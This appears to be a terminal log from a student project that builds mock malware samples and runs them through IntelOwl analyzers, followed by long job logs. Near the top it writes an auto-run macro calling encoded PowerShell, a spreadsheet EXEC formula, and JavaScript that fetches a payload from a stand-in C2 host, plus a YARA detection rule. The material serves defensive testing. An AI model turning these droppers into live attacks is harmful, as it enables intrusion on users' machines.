@@ -1,0 +1,586 @@
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > malicious/malicious.pdf
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && echo "This is a safe Word document content" > safe/safe_document.doc
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && cat > malicious/macro_doc.doc << 'EOF'
+> Sub AutoOpen()
+>     Shell "cmd.exe /c powershell -enc <BASE64_PAYLOAD>"
+> End Sub
+> 
+> X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+> EOF
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && echo -e "Name\tValue\nSafe\tContent\nTest\tData" > safe/safe_excel.csv
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && cat > malicious/xlm_malware.csv << 'EOF'
+> =HYPERLINK("http://malicious-site.com/payload.exe","Click Here")
+> =EXEC("cmd.exe /c calc.exe")
+> X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+> EOF
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && cat > safe/safe.js << 'EOF'
+> console.log("Hello World");
+> var x = 1 + 1;
+> function test() {
+>     return "safe";
+> }
+> EOF
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && cat > malicious/malicious.js << 'EOF'
+> var WshShell = new ActiveXObject("WScript.Shell");
+> WshShell.Run("cmd.exe /c powershell -enc <BASE64>");
+> var xhr = new XMLHttpRequest();
+> xhr.open("GET", "http://malicious-c2.com/payload.exe");
+> xhr.send();
+> eval(atob("Y21kLmV4ZSAvYyBjYWxjLmV4ZQ=="));
+> X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+> EOF
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && mkdir -p safe/apk_content malicious/apk_content
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && cat > safe/apk_content/AndroidManifest.xml << 'EOF'
+> <?xml version="1.0" encoding="utf-8"?>
+> <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+>     package="com.safe.app">
+>     <application android:label="Safe App">
+>         <activity android:name=".MainActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.MAIN" />
+>                 <category android:name="android.intent.category.LAUNCHER" />
+>             </intent-filter>
+>         </activity>
+>     </application>
+> </manifest>
+> EOF
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && cd safe/apk_content && zip -r ../termux.apk .
+  adding: AndroidManifest.xml (deflated 50%)
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples/safe/apk_content$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && cat > malicious/apk_content/AndroidManifest.xml << 'EOF'
+> <?xml version="1.0" encoding="utf-8"?>
+> <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+>     package="com.malicious.trojan">
+>     <uses-permission android:name="android.permission.INTERNET" />
+>     <uses-permission android:name="android.permission.READ_SMS" />
+>     <application android:label="Fake App">
+>         <activity android:name=".MaliciousActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.MAIN" />
+>                 <category android:name="android.intent.category.LAUNCHER" />
+>             </intent-filter>
+>         </activity>
+>         <service android:name=".BackgroundService" />
+>     </application>
+> </manifest>
+> EOF
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > malicious/apk_content/payload.txt && cd malicious/apk_content && zip -r ../malware.apk .
+  adding: AndroidManifest.xml (deflated 56%)
+  adding: payload.txt (stored 0%)
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples/malicious/apk_content$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples" && cat > custom_rule.yar << 'EOF'
+> rule Detect_EICAR {
+>     strings:
+>         $eicar = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
+>     condition:
+>         $eicar
+> }
+> 
+> rule Detect_Malicious_JS {
+>     strings:
+>         $shell = "WScript.Shell"
+>         $powershell = "powershell -enc"
+>         $eval = "eval("
+>     condition:
+>         any of them
+> }
+> EOF
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses/Malware safe Malware samples$ cd "/home/anonymous/COLLEGE/ThreatFlow" && python3 -c "import pyintelowl; print('pyintelowl available')"
+pyintelowl available
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow$ docker ps --format "{{.Names}}" | grep intelowl
+intelowl_nginx
+intelowl_celery_beat
+intelowl_daphne
+intelowl_malware_tools_analyzers
+intelowl_celery_worker_default
+intelowl_uwsgi
+intelowl_postgres
+intelowl_redis
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow$ cd "/home/anonymous/COLLEGE/ThreatFlow/testing_responses" && chmod +x test_all_analyzers.py
+anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses$ cd "/home/anonymous/COLLEGE/ThreatFlow/threatflow-middleware" && source venv/bin/activate && cd "../testing_responses" && python3 test_all_analyzers.py
+Traceback (most recent call last):
+  File "/home/anonymous/COLLEGE/ThreatFlow/testing_responses/test_all_analyzers.py", line 21, in <module>
+    from services.intelowl_service import IntelOwlService
+  File "/home/anonymous/COLLEGE/ThreatFlow/threatflow-middleware/app/services/intelowl_service.py", line 10, in <module>
+    from app.config import settings
+  File "/home/anonymous/COLLEGE/ThreatFlow/threatflow-middleware/app/config.py", line 37, in <module>
+    settings = Settings()
+               ^^^^^^^^^^
+  File "/home/anonymous/COLLEGE/ThreatFlow/threatflow-middleware/venv/lib/python3.12/site-packages/pydantic_settings/main.py", line 71, in __init__
+    super().__init__(
+  File "/home/anonymous/COLLEGE/ThreatFlow/threatflow-middleware/venv/lib/python3.12/site-packages/pydantic/main.py", line 171, in __init__
+    self.__pydantic_validator__.validate_python(data, self_instance=self)
+pydantic_core._pydantic_core.ValidationError: 1 validation error for Settings
+INTELOWL_API_KEY
+  Field required [type=missing, input_value={}, input_type=dict]
+    For further information visit https://errors.pydantic.dev/2.6/v/missing
+(venv) anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses$ cd "/home/anonymous/COLLEGE/ThreatFlow/threatflow-middleware" && source venv/bin/activate && cd "../testing_responses" && python3 test_all_analyzers.py
+2025-11-26 09:16:36,197 - INFO - IntelOwl client initialized for http://localhost
+2025-11-26 09:16:36,197 - INFO - Starting comprehensive analyzer testing
+2025-11-26 09:16:36,197 - INFO - Testing SAFE samples...
+2025-11-26 09:16:36,197 - INFO - Testing 18 analyzers on 11 safe files
+2025-11-26 09:16:36,197 - INFO - Testing File_Info on safe/clean.exe
+2025-11-26 09:16:36,677 - INFO - New Job running.. ID: 92 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:16:36,677 - INFO - Analysis submitted to IntelOwl: Job ID 92 for analyzers ['File_Info']
+2025-11-26 09:16:37,032 - INFO - Job 92 completed after 0s
+2025-11-26 09:16:37,532 - INFO - Testing ClamAV on safe/clean.exe
+2025-11-26 09:16:37,935 - INFO - New Job running.. ID: 93 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:16:37,935 - INFO - Analysis submitted to IntelOwl: Job ID 93 for analyzers ['ClamAV']
+2025-11-26 09:16:43,007 - INFO - Job 93 completed after 5s
+2025-11-26 09:16:43,508 - INFO - Testing PE_Info on safe/clean.exe
+2025-11-26 09:16:43,526 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:16:43,526 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:16:43,527 - ERROR - Failed PE_Info on clean.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:16:44,027 - INFO - Testing Capa_Info on safe/clean.exe
+2025-11-26 09:16:44,344 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:16:44,344 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:16:44,344 - ERROR - Failed Capa_Info on clean.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:16:44,844 - INFO - Testing Flare_Capa on safe/clean.exe
+2025-11-26 09:16:44,851 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}
+2025-11-26 09:16:44,851 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+2025-11-26 09:16:44,851 - ERROR - Failed Flare_Capa on clean.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+2025-11-26 09:16:45,352 - INFO - Testing Yara on safe/clean.exe
+2025-11-26 09:16:45,386 - INFO - New Job running.. ID: 94 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:16:45,386 - INFO - Analysis submitted to IntelOwl: Job ID 94 for analyzers ['Yara']
+2025-11-26 09:16:50,458 - INFO - Job 94 completed after 5s
+2025-11-26 09:16:50,959 - INFO - Testing Signature_Info on safe/clean.exe
+2025-11-26 09:16:50,966 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:16:50,966 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:16:50,966 - ERROR - Failed Signature_Info on clean.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:16:51,467 - INFO - Testing File_Info on safe/safe_document.doc
+2025-11-26 09:16:51,532 - INFO - New Job running.. ID: 95 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:16:51,532 - INFO - Analysis submitted to IntelOwl: Job ID 95 for analyzers ['File_Info']
+2025-11-26 09:16:56,599 - INFO - Job 95 completed after 5s
+2025-11-26 09:16:57,100 - INFO - Testing ClamAV on safe/safe_document.doc
+2025-11-26 09:16:57,141 - INFO - New Job running.. ID: 96 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:16:57,141 - INFO - Analysis submitted to IntelOwl: Job ID 96 for analyzers ['ClamAV']
+2025-11-26 09:17:02,195 - INFO - Job 96 completed after 5s
+2025-11-26 09:17:02,696 - INFO - Testing Yara on safe/safe_document.doc
+2025-11-26 09:17:02,733 - INFO - New Job running.. ID: 97 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:02,733 - INFO - Analysis submitted to IntelOwl: Job ID 97 for analyzers ['Yara']
+2025-11-26 09:17:07,797 - INFO - Job 97 completed after 5s
+2025-11-26 09:17:08,298 - INFO - Testing Doc_Info on safe/safe_document.doc
+2025-11-26 09:17:08,699 - INFO - New Job running.. ID: 98 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:08,699 - INFO - Analysis submitted to IntelOwl: Job ID 98 for analyzers ['Doc_Info']
+2025-11-26 09:17:13,757 - INFO - Job 98 completed after 5s
+2025-11-26 09:17:14,257 - INFO - Testing File_Info on safe/termux.apk
+2025-11-26 09:17:14,349 - INFO - New Job running.. ID: 99 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:14,349 - INFO - Analysis submitted to IntelOwl: Job ID 99 for analyzers ['File_Info']
+2025-11-26 09:17:19,420 - INFO - Job 99 completed after 5s
+2025-11-26 09:17:19,921 - INFO - Testing ClamAV on safe/termux.apk
+2025-11-26 09:17:20,000 - INFO - New Job running.. ID: 100 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:20,000 - INFO - Analysis submitted to IntelOwl: Job ID 100 for analyzers ['ClamAV']
+2025-11-26 09:17:25,372 - INFO - Job 100 completed after 5s
+2025-11-26 09:17:25,872 - INFO - Testing Yara on safe/termux.apk
+2025-11-26 09:17:25,907 - INFO - New Job running.. ID: 101 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:25,907 - INFO - Analysis submitted to IntelOwl: Job ID 101 for analyzers ['Yara']
+2025-11-26 09:17:30,964 - INFO - Job 101 completed after 5s
+2025-11-26 09:17:31,464 - INFO - Testing Androguard on safe/termux.apk
+2025-11-26 09:17:31,503 - INFO - New Job running.. ID: 102 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:31,503 - INFO - Analysis submitted to IntelOwl: Job ID 102 for analyzers ['Androguard']
+2025-11-26 09:17:36,563 - INFO - Job 102 completed after 5s
+2025-11-26 09:17:37,063 - INFO - Testing APKiD on safe/termux.apk
+2025-11-26 09:17:37,422 - INFO - New Job running.. ID: 103 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:37,422 - INFO - Analysis submitted to IntelOwl: Job ID 103 for analyzers ['APKiD']
+2025-11-26 09:17:42,810 - INFO - Job 103 completed after 5s
+2025-11-26 09:17:43,310 - INFO - Testing APK_Artifacts on safe/termux.apk
+2025-11-26 09:17:43,345 - INFO - New Job running.. ID: 104 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:43,345 - INFO - Analysis submitted to IntelOwl: Job ID 104 for analyzers ['APK_Artifacts']
+2025-11-26 09:17:48,397 - INFO - Job 104 completed after 5s
+2025-11-26 09:17:48,897 - INFO - Testing Quark_Engine on safe/termux.apk
+2025-11-26 09:17:48,938 - INFO - New Job running.. ID: 105 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:48,938 - INFO - Analysis submitted to IntelOwl: Job ID 105 for analyzers ['Quark_Engine']
+2025-11-26 09:17:53,995 - INFO - Job 105 completed after 5s
+2025-11-26 09:17:54,496 - INFO - Testing File_Info on safe/safe.js
+2025-11-26 09:17:54,543 - INFO - New Job running.. ID: 106 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:17:54,543 - INFO - Analysis submitted to IntelOwl: Job ID 106 for analyzers ['File_Info']
+2025-11-26 09:17:59,606 - INFO - Job 106 completed after 5s
+2025-11-26 09:18:00,106 - INFO - Testing ClamAV on safe/safe.js
+2025-11-26 09:18:00,143 - INFO - New Job running.. ID: 107 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:18:00,143 - INFO - Analysis submitted to IntelOwl: Job ID 107 for analyzers ['ClamAV']
+2025-11-26 09:18:05,536 - INFO - Job 107 completed after 5s
+2025-11-26 09:18:06,037 - INFO - Testing Yara on safe/safe.js
+2025-11-26 09:18:06,071 - INFO - New Job running.. ID: 108 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:18:06,071 - INFO - Analysis submitted to IntelOwl: Job ID 108 for analyzers ['Yara']
+2025-11-26 09:18:11,129 - INFO - Job 108 completed after 5s
+2025-11-26 09:18:11,630 - INFO - Testing Strings_Info on safe/safe.js
+2025-11-26 09:18:11,670 - INFO - New Job running.. ID: 109 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:18:11,670 - INFO - Analysis submitted to IntelOwl: Job ID 109 for analyzers ['Strings_Info']
+2025-11-26 09:18:27,111 - INFO - Job 109 completed after 15s
+2025-11-26 09:18:27,612 - INFO - Testing BoxJS on safe/safe.js
+2025-11-26 09:18:27,646 - INFO - New Job running.. ID: 110 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:18:27,646 - INFO - Analysis submitted to IntelOwl: Job ID 110 for analyzers ['BoxJS']
+2025-11-26 09:18:43,074 - INFO - Job 110 completed after 15s
+2025-11-26 09:18:43,575 - INFO - Testing File_Info on safe/test.txt
+2025-11-26 09:18:43,622 - INFO - New Job running.. ID: 111 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:18:43,622 - INFO - Analysis submitted to IntelOwl: Job ID 111 for analyzers ['File_Info']
+2025-11-26 09:18:48,691 - INFO - Job 111 completed after 5s
+2025-11-26 09:18:49,192 - INFO - Testing ClamAV on safe/test.txt
+2025-11-26 09:18:49,226 - INFO - New Job running.. ID: 112 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:18:49,226 - INFO - Analysis submitted to IntelOwl: Job ID 112 for analyzers ['ClamAV']
+2025-11-26 09:18:54,287 - INFO - Job 112 completed after 5s
+2025-11-26 09:18:54,788 - INFO - Testing Yara on safe/test.txt
+2025-11-26 09:18:54,872 - INFO - New Job running.. ID: 113 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:18:54,872 - INFO - Analysis submitted to IntelOwl: Job ID 113 for analyzers ['Yara']
+2025-11-26 09:18:59,937 - INFO - Job 113 completed after 5s
+2025-11-26 09:19:00,438 - INFO - Testing Strings_Info on safe/test.txt
+2025-11-26 09:19:00,475 - INFO - New Job running.. ID: 114 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:00,475 - INFO - Analysis submitted to IntelOwl: Job ID 114 for analyzers ['Strings_Info']
+2025-11-26 09:19:15,613 - INFO - Job 114 completed after 15s
+2025-11-26 09:19:16,113 - INFO - Testing File_Info on safe/safe_pe.exe
+2025-11-26 09:19:16,159 - INFO - New Job running.. ID: 115 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:16,159 - INFO - Analysis submitted to IntelOwl: Job ID 115 for analyzers ['File_Info']
+2025-11-26 09:19:21,229 - INFO - Job 115 completed after 5s
+2025-11-26 09:19:21,730 - INFO - Testing ClamAV on safe/safe_pe.exe
+2025-11-26 09:19:21,765 - INFO - New Job running.. ID: 116 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:21,766 - INFO - Analysis submitted to IntelOwl: Job ID 116 for analyzers ['ClamAV']
+2025-11-26 09:19:26,822 - INFO - Job 116 completed after 5s
+2025-11-26 09:19:27,323 - INFO - Testing PE_Info on safe/safe_pe.exe
+2025-11-26 09:19:27,332 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:19:27,332 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:19:27,332 - ERROR - Failed PE_Info on safe_pe.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:19:27,833 - INFO - Testing Capa_Info on safe/safe_pe.exe
+2025-11-26 09:19:27,840 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:19:27,841 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:19:27,841 - ERROR - Failed Capa_Info on safe_pe.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:19:28,341 - INFO - Testing Flare_Capa on safe/safe_pe.exe
+2025-11-26 09:19:28,348 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}
+2025-11-26 09:19:28,348 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+2025-11-26 09:19:28,348 - ERROR - Failed Flare_Capa on safe_pe.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+2025-11-26 09:19:28,849 - INFO - Testing Yara on safe/safe_pe.exe
+2025-11-26 09:19:28,959 - INFO - New Job running.. ID: 117 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:28,959 - INFO - Analysis submitted to IntelOwl: Job ID 117 for analyzers ['Yara']
+2025-11-26 09:19:34,021 - INFO - Job 117 completed after 5s
+2025-11-26 09:19:34,521 - INFO - Testing Signature_Info on safe/safe_pe.exe
+2025-11-26 09:19:34,528 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}
+2025-11-26 09:19:34,528 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:19:34,528 - ERROR - Failed Signature_Info on safe_pe.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:19:35,028 - INFO - Testing File_Info on safe/safe.rtf
+2025-11-26 09:19:35,070 - INFO - New Job running.. ID: 118 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:35,070 - INFO - Analysis submitted to IntelOwl: Job ID 118 for analyzers ['File_Info']
+2025-11-26 09:19:40,131 - INFO - Job 118 completed after 5s
+2025-11-26 09:19:40,631 - INFO - Testing ClamAV on safe/safe.rtf
+2025-11-26 09:19:40,673 - INFO - New Job running.. ID: 119 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:40,673 - INFO - Analysis submitted to IntelOwl: Job ID 119 for analyzers ['ClamAV']
+2025-11-26 09:19:45,738 - INFO - Job 119 completed after 5s
+2025-11-26 09:19:46,239 - INFO - Testing Yara on safe/safe.rtf
+2025-11-26 09:19:46,274 - INFO - New Job running.. ID: 120 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:46,274 - INFO - Analysis submitted to IntelOwl: Job ID 120 for analyzers ['Yara']
+2025-11-26 09:19:51,352 - INFO - Job 120 completed after 5s
+2025-11-26 09:19:51,853 - INFO - Testing Rtf_Info on safe/safe.rtf
+2025-11-26 09:19:51,887 - INFO - New Job running.. ID: 121 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:51,887 - INFO - Analysis submitted to IntelOwl: Job ID 121 for analyzers ['Rtf_Info']
+2025-11-26 09:19:56,949 - INFO - Job 121 completed after 5s
+2025-11-26 09:19:57,449 - INFO - Testing File_Info on safe/strings_test.txt
+2025-11-26 09:19:57,489 - INFO - New Job running.. ID: 122 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:19:57,489 - INFO - Analysis submitted to IntelOwl: Job ID 122 for analyzers ['File_Info']
+2025-11-26 09:20:02,544 - INFO - Job 122 completed after 5s
+2025-11-26 09:20:03,045 - INFO - Testing ClamAV on safe/strings_test.txt
+2025-11-26 09:20:03,079 - INFO - New Job running.. ID: 123 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:03,079 - INFO - Analysis submitted to IntelOwl: Job ID 123 for analyzers ['ClamAV']
+2025-11-26 09:20:08,135 - INFO - Job 123 completed after 5s
+2025-11-26 09:20:08,635 - INFO - Testing Yara on safe/strings_test.txt
+2025-11-26 09:20:08,680 - INFO - New Job running.. ID: 124 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:08,680 - INFO - Analysis submitted to IntelOwl: Job ID 124 for analyzers ['Yara']
+2025-11-26 09:20:13,745 - INFO - Job 124 completed after 5s
+2025-11-26 09:20:14,245 - INFO - Testing Strings_Info on safe/strings_test.txt
+2025-11-26 09:20:14,283 - INFO - New Job running.. ID: 125 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:14,283 - INFO - Analysis submitted to IntelOwl: Job ID 125 for analyzers ['Strings_Info']
+2025-11-26 09:20:29,397 - INFO - Job 125 completed after 15s
+2025-11-26 09:20:29,898 - INFO - Testing File_Info on safe/nop_shellcode.bin
+2025-11-26 09:20:29,938 - INFO - New Job running.. ID: 126 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:29,938 - INFO - Analysis submitted to IntelOwl: Job ID 126 for analyzers ['File_Info']
+2025-11-26 09:20:34,998 - INFO - Job 126 completed after 5s
+2025-11-26 09:20:35,498 - INFO - Testing ClamAV on safe/nop_shellcode.bin
+2025-11-26 09:20:35,535 - INFO - New Job running.. ID: 127 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:35,535 - INFO - Analysis submitted to IntelOwl: Job ID 127 for analyzers ['ClamAV']
+2025-11-26 09:20:40,592 - INFO - Job 127 completed after 5s
+2025-11-26 09:20:41,093 - INFO - Testing Capa_Info_Shellcode on safe/nop_shellcode.bin
+2025-11-26 09:20:41,100 - INFO - New Job running.. ID: None | Status: None. Got 0 warnings: None Got 1 errors: {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info_Shellcode won't be run because does not support the file mimetype."]}
+2025-11-26 09:20:41,100 - ERROR - IntelOwl API error: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info_Shellcode won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:20:41,100 - ERROR - Failed Capa_Info_Shellcode on nop_shellcode.bin: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info_Shellcode won't be run because does not support the file mimetype."]}}. Details: None
+2025-11-26 09:20:41,600 - INFO - Testing Yara on safe/nop_shellcode.bin
+2025-11-26 09:20:41,638 - INFO - New Job running.. ID: 128 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:41,638 - INFO - Analysis submitted to IntelOwl: Job ID 128 for analyzers ['Yara']
+2025-11-26 09:20:46,697 - INFO - Job 128 completed after 5s
+2025-11-26 09:20:47,197 - INFO - Testing File_Info on safe/safe_excel.csv
+2025-11-26 09:20:47,244 - INFO - New Job running.. ID: 129 | Status: accepted. Got 0 warnings: None Got 0 errors: None
+2025-11-26 09:20:47,244 - INFO - Analysis submitted to IntelOwl: Job ID 129 for analyzers ['File_Info']
